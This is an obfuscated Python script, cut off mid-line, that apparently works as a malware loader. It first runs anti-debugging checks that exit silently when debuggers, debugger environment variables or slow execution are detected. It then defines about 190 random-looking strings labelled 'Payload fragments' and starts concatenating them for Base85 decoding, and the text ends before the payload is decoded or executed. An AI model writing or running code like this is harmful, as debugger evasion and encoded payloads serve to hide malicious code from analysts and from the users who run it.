#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cduKmyqgqtNwfl = 'aonrlq4GE4{wi<Rn1&!NnBi%XsfqoSr8O%)D&PZ*uAo<kE4<4BDI_$_HJ!iP%nz'
_cfskUAQp8_JA6l = 'o_Lz=?TCE$;fMy!N`0)sczmXLGxA<)FU82IV$^0ncC*U0JKA?nL-k_gB;9`dq9y'
_coEE9uSHKWXYXK = 'RR8jWfSAM;betnV9W|iqnMgoE$h7os{tj>kKNd78dGJD37aUsD_EH8+4@3(Nky`'
_czFrHiHUgJeHQC = 'v{2MFHZ55Rjb|q4AV`I&qRrq$w6wbpLnqywZ51A@w+KfLBJkj@KFJ%h}uu7=@3E'
_cjo6sCTI1T88Be = 'NvWP~j!CA_lf{ZMQQ4-6>#4_0o6N%YjHmbIw|UFI&d83~U-Y;<4uQOgJ!ee>jDU'
_cfeuPC8bmavqQM = 'tpEg7WoY7Uu?~cO3zM(1kv`;UHe}AKXddisMapwSeF{%&a;Q)+1NxdRMH!aQP7u'
_csxFZVbHUMC7Un = '-9y02%^8^e?P4_mn06TXDViVjAmWtFPt?|Soqy{Q`!s=wmaZy`f4`*22)1fSkfN'
_cw8TQ2KNRML_Dk = 'aeJ^V`<zi+3gGEAyaL#gjAiBhd8FDB?YIxDB~8Gc#%|+z2#Hw@F?^HZBX|68LzP'
_cuFEttT74sjMLd = 'C6rs06dBWD4P>rhYpxGH)D|!*F0M3K>+iGlqbe3V?x=h%o?bWyfQ3YBvtcXr><C'
_czJ13WJ7NPHW_x = '1hcX;ibIS&6S7fys@7#|NRV754QgVA-?KRu!yW|4+WfkKAZO`XLIl(!>;UFgUYn'
_chXeIrufASPJMg = 'jrN3;5>G1ujJ(=Dhj^i(u2r7P#6Qaz+)e*i_d8-{?{FbK>`B*IC$ZhjUn93Ra$d'
_cwNNTSTWRqZNta = '`!9&R-QKF_mzEcUH{>S=C(PNL#atHEQLaIsQe`vth_8C7iUCZKTAgi)24rkcx5X'
_csGI2bT3Jnw5pU = ';5dW7gV9MMowsG2W!_tJ&(8{f+IbaD!PaM&|Rv(&>C=@(Mn>2TG+kZQ_WGQjLb('
_cseVgougcbQuYw = 'XBQfd3wqj#htx?J}*A@p=Klj2+!{s;cq%OjfsM0N%DWZj;MyN?uXqN{KHlsx&QW'
_ch0LpOL407Abpw = '<>K5Th9<J^IUcbz;(%Q3U*7ZRTC;Zc9G@ms!IF*xd=ZCFCQ5;4Dv!G4G%MNRby*'
_cg6bQl_mgeMGpE = 'Onwb_9Z`HAX_;6^g$e|Ld@&D9z2UVU0p@~%EsW?!(?r}^`y%C>5k6y)A7PN4^vy'
_caZ6kJuCTvsTzc = 'RKcau^+oeOgFK6{C0?I$<8OKQw8|FC?N+^E(MX50vPvN#VVfjR&IIFH{+P%-?@k'
_cuxvVbmM5az5Kp = 'AOpCtievtA6}K#H26X~eEj$QEdRm0{_{1qwR(ehvlu`0cfV1L*q`J773v9&t<-N'
_cuVDH0Mvd8i1oV = 'T_?7&AT63#azHmTQXjb%{c4%2O+<3p*7X8-`NJ;tgf77w$;T_M=nWy-sWIrgT(&'
_cr7As8p34p6msC = 'tvHI@7qp_X%Te8eKDG#9Qrf-c*XopAEu)t7P<0#7oWHb1c~i;y;TvkNDm$Y@lbh'
_ceJi88V8yiB7uN = 'Jp0WDg&4Z_vooW^c{Go9K`FREGMV0}wG|Ibd<ju36!{zqOnR4oaB131+JK!82N?'
_cgg0BxFfuTcHJl = '^eF_Ct2)1wk2mSF1X2X2yXr~&?YZYZwTwkq;azsRbG{(suho6bJm*Pb|)#^@L~I'
_ck7hy68jShx3m2 = 'C+q9$uJAs#)$2|lhFq*(K$49U{~aL%$U-S=tW%T*vu9r?H5h#`*LYkQKks?6g*Q'
_cuHjbnYDEomlIr = 'a-`$!{eS>e^FTRU6G}{^{{ZHHM9S!|)A-c}(C7v->s%r^|R*wTh-gS%xQ8Z7md9'
_coZnJhhk9f0upA = 'u0NuJkraPifx`%<N#GcGtC%8#c46q|!K=T#=ImslR2}7izJ+tJd5@S}C!Ws&M*%'
_cjSk13KXK9KjWq = 'yRXY_s9A0IN^`RTJQM*?IzD*WB-XLL8*@7fADlo5Ddr&u;Fgl@&juR@rbK<@y4r'
_cbRJaIl3kiNFlW = '`Ma<9FZ-OxDl?EF;F_y*95A469r5JJ%YC3dGgp@WH6b~I$O#oU%l%rh7j{BSolb'
_cdGmu1o53sdOH8 = 'Y@v*KsQHO!E6S%5h#+z6tM@vBler0!F)U#{oOW#5!t6g|K&4*PnO&Qhaz1;0`PP'
_cdtJtgwYReDbKK = ')zOmsipYd|*%J9fHS=w`|v|jg7c`}v9fbc5}IPKciI_Urp4`PxGJtm#RbI;l0C?'
_crMOaClfna__sc = 'WmE(T-7sIt_UE^MIQ|rss$CrqDIwTfiVNq9JYOaHbiQDeV>MtPMq7WHe$|jhazv'
_cxjn70sTyVKqxV = '0C_`qC4pr4pEQY_e5kFpA#Ta)7<M+5d6H6Ri{}x{Y`xdIXiR?q&e2qrn>Gc2W$C'
_cu5dAx0FHHMZ6X = '+}Pmwn9R}(yVB7C&&{|+5M_)|ZX4j&8t`nGx)apXWXgcELY4p4ayuLIR>BU&Yn5'
_cuGHyRZxeeMm7W = '|a#jBXy&x$4eLfW4LhoVagw5Z)N%SKOACk+*Cwzc{t_g9zv>BUD7pw>0{?rRKf)'
_cvx1HU6KBiH7fR = 't+bwaHu+I3>accZg(Hf&O=Afg&gl{MHrdfH)<S~dU3m2b84jppc^`m&P#N5flr`'
_cs7TCRj80TQkyU = 'cnRTalG^$zc-nK}j7BZHfx*_h7#Lrt}Y&Ypk}}!Gb}aw{T5cv0E@+bJCdGLErxM'
_cxvjgUf1K9KtrW = 'KGO3Pq`YM#PJMj%3M7^)(=fDXtuJii3b=H|_mjOqGRq1)*NVBSh&aE^Np%LXB2H'
_cnWXbSSWPnZ6Dm = 'EueS6%a0KF_HjqTDnq}k!r++@sITi?@*t-i(u*kRN}af~_6%We%1S_Gf1IoOqW9'
_cka9ui4sKchShL = 'xWj4=}S4e-4pW{t;E6+C;#>1>9=KIArC6_%M$i8mXgeYC_ESuApwxDf%^^TWX|}'
_ciLk8r24bgGFmD = 'e20)n=J*#(6fFeF+H&#`#8QWSZj~#hqC&;&&T^PF{nLg?jj}aZR<tNf+%*O)Z)b'
_cpuTGQlJP5loOE = 'AytYk~jcwF0jxHP<3g2Bip>ZcG3DDSIsh#CuQ|wN>YhRsD+UzM8>@gA$X?f~ftO'
_cyIicTkZ68jDBw = 'F2?=bOzrU-7o_Kn%_&so95h&9q`TUVwHN@B@{mM9^ze$UbpCCtk_0@XoPounkis'
_cd4fQtpLlwpij_ = 'd}S9GNSC(_?00)Q^wemH8q0)h^=oUY#mYj`e69-m2dG^1qV;{0;MZRVxQ5;+9Tz'
_cmy8H0O2wIcnQS = 'ZwZ_ox9pg*atcj-qguk-nP=o!a-+Xt-3vVeniU_tg$lmK{m;*9w2iK!t2N8)m6b'
_cehYTBP0it_die = '1i8k~LK%uLYiQ=ZuSuPDYYJQp+!EM|!uAjjUZ4e8M1GLZl*M#Ak51W{Ao{w3i_$'
_czVpYWwp4kIz7D = '8c*m~e0lC;dElZ@FDH5IvhYD^-_e?nQg4gPn~aYt}SVG{ouut3pw)&ZJO)=B`a='
_cfj_xqUXZtZtIN = 'e^V|vXh6UdP}$#qZ{L@aJvJ;1GTL|9im8Gw9nU7xTxD!)%mdS0Q)=*(%((nlgtC'
_cwZq9fh5dN4S16 = 'U2&><$DR~dRP`*n`irXL@gkA5U2fWz<C#h-IVy>~7KA^eD;tHrmJcf$u5$!i-Sy'
_cubqj6rD8xy9gt = '3Fm&fJM{)%)7+BEFl(0Oia;rF&9E9_UIE#g&ar!!^3EK(~8mMXfjCSc=Mgxj9Pq'
_cqAyvp9iYVFy_k = 'bn5}agn33vh&b&DBf4{H4>5aPuN~;kIA*O6>6@3{vSj>rZanmONme-+iYPqfax@'
_ccquEYF_9ZxNet = 'vkHakgOer4&L2of3{xvZ;tUey()wf1PnZUs99-OpRKd1b3U*>w%dnJK8^k%FGWL'
_cvOJJ_UPlSo2Oy = 'sIqO)#+`N6M2|ZO_W9VSAGyEjUJPi2@#fpMKNC-snAT#mq>x~OD<z|FgKT~;;9Y'
_cnROL_2Rerdejj = '`(&=E)!l<GZXG9mTNg}i67tm~dh<2FYElT!-j4g05ovF%Vv8f4~J!8+l1HdC#eY'
_ciEmKYoCj9mES6 = 'x-W{v{m8!;ofO_p?*T%?r&Q{a|VgAx<9a)ZzuD_BFc98a#a)_Gr-zMy4$zYy57i'
_cmVaAfjzd92wfo = '()Y-bAn8{oaC9UPDcbk$QzB7uiOd(~<z986{a~AH!v%gN__&RvmQTK}=e36%BR<'
_cq7WI4nIO8As5c = 'qmpfys{yEuX*7R?oG^B>CF>AQT3ormisvDa=p}$Z!zfcVIMPWJD}@+s?6j#zQCY'
_cwRvDpL7nv7V8a = 'zo+6*Tc#Zcm`KF^VE%-8fgrDe*#S#|<{yLn)dBV&bE?~L;47nYip&t|)`4H<XMN'
_clUQsppQmEypui = '>(72B?$nrdIr;!ny?OeR4RFR*nULAi<(+WsS{qJ>E@{qoMd_d{J^`vP0c5o0AKa'
_ccUpLYjPnxX1wH = '%AY@51Pjx%c#WRy~P$=<S`;eRGtG=tHkW=9cREc&4ZBv*Zn@Q>nb9|1JKD~A9!M'
_czow40U0sYLbKx = 'lYc}SQ`>CXDCM@15E1}tXusxDHk>~_`BuYUHM4|$XjoQS4D$-~7EwmON!77wB3C'
_ch47lWGMUiXtqe = 'nB5ERQ^R9_{dG=d6PK(1vmfdItl%@E1E6*(+1a8;+%BHF}W5QO51P1ET^a7FJcq'
_ciJv4vOV0rrHe7 = '5HVH;z@ATI2f2A72HWAwA@Rg@-z3lP|3UUPP>}y0D2!MA3LW|Z=71i_udlM4jZ#'
_cptHowm3LsRDFG = '3=Kgyfydk8<hmgOqidk!w}<jrl1ySRs%5n<q-HePey1=@pF_c7?40_ZvWFa)(9@'
_cttdNjfBZAeUpf = '2(!mi4naW&IlkkX?R7N?<QB{OkWuO!-D#W^d}mT(wkv_Xhce6HWfe1NkYzt#*Tz'
_cdj5LOqdd96XR8 = 'c({(!}Mq;-F7L2BjND(lb<squ-h>GJuN3=Rw$9itTUeYfATh$X*(`Ku9y1fZxMC'
_cwCVu7Nt1Ad8YM = '+Z4+GU2KO3hwo4w0MYM{J#{;7@gKCA=20%Tk;j$Ql@`D#}OA^v$OFR5L&0VoRX)'
_cf69dhjuiw9mdY = 'dmBJVDw1dBXr;A!a<MhOni=%wenIBTCsEP`muissFuu!bTE3*UveM=1%+8$*pvC'
_cca3x09t1koetn = 'a@@s}`YyH#8f%(JV1Dh8-_@79d?MSkih{4NGMWg-rSvr=!c`p()B1Yat#pW$WX-'
_cumbcXQhNT8B3T = '{}|}^snLd4R%s4ve8j7m^Wj<O<=IPQ4^>FW_cEF2283t>&o8-$ZykzgwVDb1*ZA'
_c_SbeC9FokS47H = 'rvs{ZoX<<kOvaL%}fIA!ug+Jy9DlN4W=@N6MD`I2~H1eeK*sg~m8I<$C8de)Q%8'
_czTYBgl3p1dYX8 = '-`eAGrWWlOUMEk1~o{w(D*Du2*<|ozJMWOf&1rA)XR%6-vnQ=*haJj${ibh(VSA'
_cesVIi6ByEDAHh = 'T|gCc8_}0=*L6TaY|teJ#XDxP*F6#uR($jUZiPVE%>Pbq?FqYl5v-evv33vl>?3'
_cwlQL3ssH4nEmF = '~B%C6csi>-}{T&Vmd>=@wKtJ(;&Uqh#=C(`gmkIZZ+17%9bqQA=GxC}GBB>>wd^'
_ccDHupMfy2IPcG = 'pPO^G_k&6Sm)If>>`%grat7Xe;B)oSx$D3U$Y_j7VC8uoH8B(1zx5NmG@YTM$<m'
_clIhIlaJFt6koa = 'a2GGCI(7C8E&cvtBpA8p1%e8^N7p~KWvYzEt$6u{qTg@Fc@Vq{-xIXw$BrblKX5'
_cac1fIio8aYeLg = '*{wpce5Yybb;d%fGm*+7fz9qg-eSDzVOFp4PN4?ePYahSXvVLB6_6vs;j;JjD;D'
_cgj0XGwOkoGbn8 = '!+za89HR_Y%c@QPtK*aH5rB3_0m0oX_g6^qPRN}^IXv_;9zXJEQ=3)_RPNQSF01'
_cfL1rcLKK8EFxF = '|48Y{RvuLiujbppQ)jw&l0>lr-n5cjr^l}T;Lku5Fpf`YPejvX=z<C1nx?J-Vo9'
_cuviCJHv93ZweP = 'Q_v?q0RzD>P-g*f{Fg;4+=a@st=midxEE#ey0HOnddSPd|6ZL6MzuFVziLP1ADd'
_cowFwUO7rTTVHq = 'aBQv`y#Q@(o#@IqFmWA>xVd!ymcCdoc2|5l%F<lRBoBTLk#wU0<VKDN&mO=`zEj'
_cwm9vGke3YuRrq = '}<K#AP31%Up%s%E=_-i^3<_BiaPGXr=WFH;-UHF^}6z|Lw#P8;iBV6=tnim3F~<'
_cijH0iDG_A6UVo = '6$RXG>co8%mk(qzSEzv#ZI(5$65krKg3O+nbgH9kxjYrcM4{4mUHsYupvw#RwBD'
_cn8wZH61M9YsGJ = '@>m<lk!vX=t$x(248k|vfwsUH~Gmd%`mA%6?df)$opJ)S+#bUeCxD`Wf3#9-vm+'
_ciPxI2FzznfI1F = 'I&$U`0TK6trLtdYZ)D%_IQi4vK#*eGRV94D+odmpi!BPd|8(?2PR8_jy-P1coa<'
_cmlmiGKIC4UUxg = 'Fe+Eva6+f@zd9j!=RWbP^s+YvTPND1jf@aisG^jDr6IVqW=!B(f*R?-evjS7@Yx'
_csCm8IMdXk7yfi = 'p9BBv%Sm%k1V6HX)AIhNbPn&J&(q22KW}(tC0rc_zNKGf=lsAz|oUlKnaW%D=Yv'
_cuANfcDURiVPq6 = ')sxoEkX-UeZ9M~!3n`p#PIKT&=N^VwP%!yu%(uGqk1-ThW1JOt^N$Q@s=&q%9xL'
_ca74Ul9gZnuM98 = 'uoxe~#YmnVA({}o(stFRl=h9pmy+$h{Yc6PRf<31%w-$76fAB{v2(6DDi>PX+#&'
_cbynAv0Q6iOBIn = 'wwrmnk&e-MAg0I)P0BId15q}L(v*+<E|SZ5z^JB`EJTrx{^e!mo0no=97<CjJ+0'
_cddr9VwOeUNUZ0 = 'uK+rRtH?M_%ZJQIpjW9;!=I`Dfgv5pSJNcf?vP9;}s^UYX^^$isCpA@gdS8W3e4'
_clmSES7Fu87a0B = 'pno7WA5^xA8%0wfb16(~v_*&A@NqLS-s^q1f;s`M@9!-bMc&b=5UsTQ4O^1M>v^'
_cf2O3PZ5VRzAC7 = '*~vwFTlAu%5p^ixzO76NupbP%j%EzOby=WSKSHn{rAQjakp=!3OHdgtvdjW}0eG'
_cnr4HDlOx7QzRZ = 'QIDeGxnk0j%`HcnC#^InvS&VEi+X7G_B35FJMu3wGpj&+ZfBR_i|QRc>DP!Q4AM'
_crf5_YHuR37E_0 = 'G=?Q%r%<uemeQd^~-!QVG6kBK$Qk>Rtzf*ZCmaFNH?u3w(8kW{pjL^$O}hfH~$Z'
_cesfFyRQ1YEaED = '%8zy7><ZGD=oq<5~e=X9caN&xGqz5QbCMT|?3{uaR=hKM^)3mY8KXQQFe5lt+Ts'
_cdUdqkclMEuU5p = '&in)27Z+LQ-yv$yytDC%YdSlfPeY?z2ArQ_Jcovi!=looOTa`kyK9xA)b{gk>w>'
_cd1fdHVHcdEzWw = 'AdgMmU7VvUq8}gH`?O-CCiPc-Z%sgx>ISn`PN*c7m3|r{rqJU7TMC|9Q+xTSHnT'
_cvI7ppJn0dM4zD = '^mP`9hNPoBoaZ@;beYUE=a-^Qj^9?-P>fOZuT>qDZ1LCrgmTF|MLc~6pYLW<M0l'
_cmyrulsZW6wpDG = 'vM3Da_pJvo`a@)E&K*tO67kb>qYesuv$^1p9`yiz*vL2ianWt7|`xrbCgaN8+@i'
_cnvr5qdVrfwPSF = '8Rf#0{v>ti&cdU0fIJXEUdz1Nc!W&}>M~_uY6JWIGc4^e%2yT66p<N?E0ortM0@'
_cj5r4rHii4WrQM = 'x-hVcqOf72ttQ@77N&$gH0E)^Pmlf9Ne4`6Sa}-o0kUTtlCuALIJNhn`d`CVjof'
_cfIpWTgSiACjIU = 'F^m%@=eR@V4m+Z90Glm)W=d;;3q1d9UsXLtQjV@s2j1nr(-2W%029|<OOBT%9NP'
_cbxeYGLNtO943H = 'H~)ODz`LWAm<rv)Ut1VuIzapj|2WPMPlAnY`Xw4BEc5p#g<B6nWQK?pqYOELC`M'
_cyXfrQuoQlwvyg = '0aB~sfFEXa$Rp18-b3Rq=@yoAK6lrHoxK8X`&g+BTx9Z29a1dRIDM_4L_8t89Y2'
_cvI9Wr8XyXDQRR = 'V%dfFF%7-23>u>5<@VeFXB}JHFa$hrIk+nL^_f#gz%|!zjGkQ21wKF&VP7a$Z`h'
_cfIr3RXlvu8tZX = 'O~Y)t&&6O7Xocqqm!{7i{o~`7*O7E^1b=3qA0-nA8zk^r5lMI!N|iKjM){M^N=$'
_cn8Oxha4E31bKg = '=!tNbTLojW(}(+?aL=cE2Uc)sY6SfuFLSE0kMVBey-lOts0&{7sQv%yI}WHUu<Q'
_cetdLPK6wUzkPf = 'uKxS>)fB1S6{HRm=?AY#0KDVE$AyyAfC85+1@Rbv8<|3(?~j!_h71IR~QDJ1sRL'
_cfryB7AGKjZ1l3 = 'ytTWZ#00lpO=NHRrW&TtGA+~`TM32++|7C>a3u)+X@+4H8IbxoHVQpOK=UiZ5mt'
_csX6Sy_iNWZo9Z = 'eEnYY>01qa$d$y7q^lZIBlCt7T7hb{PdI4#Q%;p%(z}*&m-6z-P;ax4yh-x!(n6'
_cra62YEv5ExNxC = 'v4HTp^{pW-ob{6KtMFeW?l}bXeRXC1E!r&ncPUL+ZiVeGED|^oldJR>XIAZc|)v'
_cvT66HTY67RbEd = '@nZ^M80oJ+Xpy8%4iHp;IAGDiF+!Co%WgL(v)BebPr7lN##NCil*ijqv?Vx1pjr'
_ccxFfdUOApYQO2 = '(iiM>G3<3TGcW?-v3?cbKv!WbBbz=RN~T4bmLv;oo8>X@}0bVF+Q5U!6L-RaoEA'
_cu3v_iO5f0fXt5 = '67ccszn8v5TQsX;Io#k6c6>&oUwr9x&6U>1dEICP*K~NR?J7$59#|u3<GOk2Ngt'
_co89g91UF7kQQR = 'Md#INW8c<T^4Dqk0D==mN0O0}49bpzMt+^vlS9cekV=oyi3?y~l^Q)k*JImzp2s'
_chXvXPzVFBLL89 = 'EF?=F)TA_}d)r)d;Lg1@mxR{k8P>hG~KEO}AJv;7b!8`;@&91m%{!6gi9Kg@#^?'
_chSiuF0Eid6qUC = 'Jplg&RKI#czs;HUg|8m7Ay;36W&{63jW?T|ocW%^qeSX78niXE4<>B7q#3yU4yj'
_cgLJ8W7QjeUoKH = '%|flUn8|5ad&@(}`LT~BI{#(iSl#Y8YpYO__QMZdmrTWIO-k^?hmjo8KmDl09^<'
_cmI8jcbu_7zzkO = '}6#ty>z{aejxeW*q-OF+~oGsx1y<3s0<oLfr`R~f3NvRAQcbz4+}%oGt_&NzmWF'
_coQrxeu5uPWOwg = 'P8t*R(L~w9R((7}Xv~{OW84sJ}-%`3G`?*-oaU>;E!hn%TKLRUJ7it}V)O)te%y'
_cwP9Ia_L9oRVLw = 'dBsEKT1P%!)sjXs_5+{~baF&VbDQ|K>w*$#l~Xqx=JmIURd7dw>Cr*Yo;I_O6f)'
_cy5BC1gGhbFPMi = 'Nnp)H3#kiP`3Qr}*WIjtC`zPpsXFNi`jpO5<y9A^`t?IKFhkOc8B}B~p~jDGBo3'
_cwzaGbxa0yv_IN = 'I&Dhl)K2UsH}FAAxa#cX-Uxaj*JU~STbv`2UfV3xR+x%inxgBb2t4Zi<zlr9jfN'
_cb3vLIXhC9sShT = '?9__=Zf7D3&53*I(g9kClZlXofMD=;CG5^a+p^fju%qTIB&As1Vd<0>9Vy>ZjRH'
_cgs_C245468mvV = '%qypb$2Iolbt8#+!UtaHwJM>99uo*C)cDLE9psnE<wCmkd)J-H;|GqYRcGSYB|J'
_conTO5RG9S8g_V = 'M2esjkSHuN|C#(eHX#=dFgRG{AD}KsldLRoj4Jg$q1dvoleH?yS3v4<_UyXZJ>U'
_cjEM78tmTyR7Er = 'kc<=Kl`UbHy6HX#714NUFi%CN)s6_re&M(j_ZRN~>c%Fjn1C2ZU<%X{R*Vw@Y+x'
_czsrQg_w7T9ZsQ = 'LiJz_O~0mPO`^H>E7Dl$dpD?!fPwPs%*B4$91CpOktAjp*H5Ix1=d6|Mdz6h)V-'
_cp7CtbAS52imD6 = 'Tz4OJ@b*A1V8Oa>8~9_?qK^$rMqNUif~J>L#j#@=quR^QDF+S+4A<6JshiKPAJ#'
_cnNm4CQLTNSs4z = 'qt;vt+C`WhT@SucdlFTf*37kNC+i~KVbKkQT;NSqF<UjaakZj$b?jG4r(;l0Zoa'
_cuQjW2G0FdYN7S = 't^{xGU@QIF})TqLLKpCwzv6z!hHY+lT4Q&r^2{F0>eXClFt>{+AaW8h1h!5?k(S'
_czHjcbxZuFeSdi = 'iDSdyVliP4n5}5vm`ZF!B#y)Fdd8J-<EPFG4PMPPv8)Trdeaw_!@O_pDKhF-1Zh'
_ci73YLi0EfCN25 = '6&k*i~_;s)wpV9Ib<zT7s-uyQ09<JYKFB-iq-7i;qu4N#9%_!#@ry8{rmklQ=TP'
_chUsANpzvXlLHW = 'lz_Ziuge}5hRO7;M(oxIZIyrsXL&AV&HjUEZ)Ib59_X*_u1)9nf7lftZ~_mV+{~'
_cuEjoPJ7xGEyGl = 'hXj5O;W!z3?_U^0FBU?1PfA{nr;5?!<vul)Z!nllA!d$La?<I_eK<NcKhkbhV9^'
_caubc2Zijf37ml = 'd%l_MVYJ8c}17x*$(DSP3YTck{)F=>w+4)nCVt1l`c#o})P(KMp)R{WkHVmQ4ZG'
_cjxBExIbjzEPww = '7DX{WLz6GPV-Q4_!*0F%P2fLHMZUEGCom{m<)8Z4yW@$EJ{E7$^g2zm;HctH>NU'
_ckSSFp1fwowwHa = 'appVYt&uyBK{#)Tw5S?dJ)_Cj6hj_9BRu?V`kO-$%9x#8X{++HVfu6{o3t6BYfj'
_cbSMzWbW7oFPXE = '}{a?98ib&GRlWU*+|3XK(uhUXCx|_T-+LLFQdXVf*pieiyMqt=DbBe8ANGuix9W'
_ciS4d9upj_Y7ZY = '~<A%%NNeJ7qRSqp5ETx{`dVX+E2@pQEJN>QUwJN|*jEY`HCzJg~-;(>;RxZ~%JJ'
_cg7sXDkyFzrwDX = 'OWm`9Z{so5f7fux>>q{|~m0f<=_#h5MEo!_+nA7}Zs_!Gl7=Y3EOEmxTXTW19BB'
_ci2URgniCjjZgg = 'Uce>z%(IH(D%~a&WMVvv+}uMw$WAYjYo??0_j5I_PiRoN&zbCZTDf2_d=@5JDc+'
_cpqISPszXNotqW = 'm9f3y)S6Q(EzK<T8<zN(L5yqz%D_i-etoZ>x2$kggiXa@`UnMU?#0rU{ICsw;+T'
_cswVmcmQGzifSL = '0QhL2+|qZ3HzHKYrI{q?52L@w<CN=F_4PPe_tFHE_~@rtnhy((`O>g?D}qY2A-Q'
_cxyF_zm6E5T0ai = '*W<;l2JS@ojj*|*)@dxkiMZB<2X2H6FJnc52#RM$rhTv+vW>&--kP+3zt@~x^j%'
_cwb1_j5XFf3RRf = 'P|x(}wrwk4<H+bYGEt|5SYslmv!6vJjev_%<69MH~-wt41@VK8v)<Xyv6AKb&s^'
_coEU_KGFGGlrC1 = 'fH2ORX-cW$YL{Y+7>v%Ob5Ieh8T^FpjPbv<X_w@<Cz0apNeyrhMPdmWsAkl}hZO'
_c_5SDmV4flO3EI = 'x>rsxV!$_LljFUHn!mKr7tZlm>9E49$=KMt98414aA+OOr(iSiwxA<G4@O&0$KR'
_cs19m0zCIL0ZWh = 'dSUnZoB{>r6#2pl4(y&Zj~5ce7PwYxeocn!fR^fa2Ex{R37u-G>N{ym0I<F1nv{'
_cxQvUnDasf2O1C = 'nBqlRmSuq#@ZJ3#b{QEwW@Wqbf2x(xcfBrHyR8>g#MjJWhkYl4GwnL7FusZ?QtI'
_csJigg3lch5GHH = 'vGZM2BS;3g`7ZM+Fmsd2{bGpM%TRne3Ni0paCk|2yxDOg6U=11%}hSi8vb<g*gT'
_cxGuT607ZTreJz = '2q`+6iA)9Sf4!Qbbo2FZFy@Dzm=k?%y6Tmi<aY@OCDc_~BuZu?tBQ$F`0{wV$34'
_chQhXCQOcNZbRJ = 'w&G~Xoz-tDaP_6055SAt&^Iv<!)4gLl6Ipi2KyVCOHQ~(uEY)K795G%>k1#fffe'
_cuzJkUrmVIgdtW = 'FS2o5fgmNk6?9rV6uL?aI*_CZ>>@<hEvwwQdN(RU`a&-$1HQSAxJ7dDx{RTl=CF'
_chNj_iRoJtPTgx = '5*;@7#)k<v%@J_Pr`B-46_Pb>hhit%8ES;iDGN8{DDH*LVi&=N%DuXC{H-9M1^P'
_cw8_ufezfTqG9u = '%^&!l?B%*|BS(6U%p%nf5bvkJxd<DGs;_16BAF6MJsmE3%rk+WP5l#~ks8rj}H@'
_csmTJLOBpiioVl = '*upV;Rm;>r9~)#?m31JonPr^jJQJs5*61NN`B!E!D*YZFwzqg;u|G11egddgT=n'
_cjMxOGWabelvqu = 'UR0j%zh*BXB|srQ%$G2V>@9BmXq5}s$Gr0#pL|Nc<X992H=ERgU&yx;@vKNhiei'
_cr_CNYogH5iZ2o = '2F^M{!-sNS|1u~eV509Q*J~#Zpr%F_kGR&i4F`5o<xu|f<_1iuQL)hV4_XLQSWF'
_cckuI10s1HnkRN = 'd!Cd!VyrzC{^MD90cSy6_wjHca$?gf*<1zt4s`k^I*#r<0W1h;&n*KH*#X1~X>0'
_cbxfjeQyluSjnu = '7M5Q>E<;e>)V7{TOm|$n(rdZ15xWm7mJ6UclJ^44^WB!Xj?qj#hVwwX0Qs>h}Zd'
_cuN1w1IwSt3F6u = 'kUbePh;SOdHo0oM+xeIgX|Z1eAp?~I)a{`i0h~Y+Bq;Vik$E+ok}Gskpsnq>Rpa'
_cyFXVoQq3NLRFF = 'J8&ex%E#U_u0okRYcb^cr>uK_Xv9aau9K2w)(gt9csC0=;r$;c-j3%Ua_;-N{QS'
_ctcN_IyS31XAFr = 'wK)##gh9{6;H~@Q|W=r7~!evoSzlgknYlXkvB>hvOHR62u7BraDKN`;Itu@dkRE'
_cqp3mS2zR_mE1s = 'K+8O5fjPcO`sa|3I8M;rqGJr{%H12a9F$h)Dj`BTdDmed%+fkv9YVBs#&ZlCkWy'
_cyAsQtv6Y8iyko = 'wwJWGx*cQakUOyWa'

_pgHXwUOceVDdJV = __import__('base64').b85decode(_cduKmyqgqtNwfl + _cfskUAQp8_JA6l + _coEE9uSHKWXYXK + _czFrHiHUgJeHQC + _cjo6sCTI1T88Be + _cfeuPC8bmavqQM + _csxFZVbHUMC7Un + _cw8TQ2KNRML_Dk + _cuFEttT74sjMLd + _czJ13WJ7NPHW_x + _chXeIrufASPJMg + _cwNNTSTWRqZNta + _csGI2bT3Jnw5pU + _cseVgougcbQuYw + _ch0LpOL407Abpw + _cg6bQl_mgeMGpE + _caZ6kJuCTvsTzc + _cuxvVbmM5az5Kp + _cuVDH0Mvd8i1oV + _cr7As8p34p6msC + _ceJi88V8yiB7uN + _cgg0BxFfuTcHJl + _ck7hy68jShx3m2 + _cuHjbnYDEomlIr + _coZnJhhk9f0upA + _cjSk13KXK9KjWq + _cbRJaIl3kiNFlW + _cdGmu1o53sdOH8 + _cdtJtgwYReDbKK + _crMOaClfna__sc + _cxjn70sTyVKqxV + _cu5dAx0FHHMZ6X + _cuGHyRZxeeMm7W + _cvx1HU6KBiH7fR + _cs7TCRj80TQkyU + _cxvjgUf1K9KtrW + _cnWXbSSWPnZ6Dm + _cka9ui4sKchShL + _ciLk8r24bgGFmD + _cpuTGQlJP5loOE + _cyIicTkZ68jDBw + _cd4fQtpLlwpij_ + _cmy8H0O2wIcnQS + _cehYTBP0it_die + _czVpYWwp4kIz7D + _cfj_xqUXZtZtIN + _cwZq9fh5dN4S16 + _cubqj6rD8xy9gt + _cqAyvp9iYVFy_k + _ccquEYF_9ZxNet + _cvOJJ_UPlSo2Oy + _cnROL_2Rerdejj + _ciEmKYoCj9mES6 + _cmVaAfjzd92wfo + _cq7WI4nIO8As5c + _cwRvDpL7nv7V8a + _clUQsppQmEypui + _ccUpLYjPnxX1wH + _czow40U0sYLbKx + _ch47lWGMUiXtqe + _ciJv4vOV0rrHe7 + _cptHowm3LsRDFG + _cttdNjfBZAeUpf + _cdj5LOqdd96XR8 + 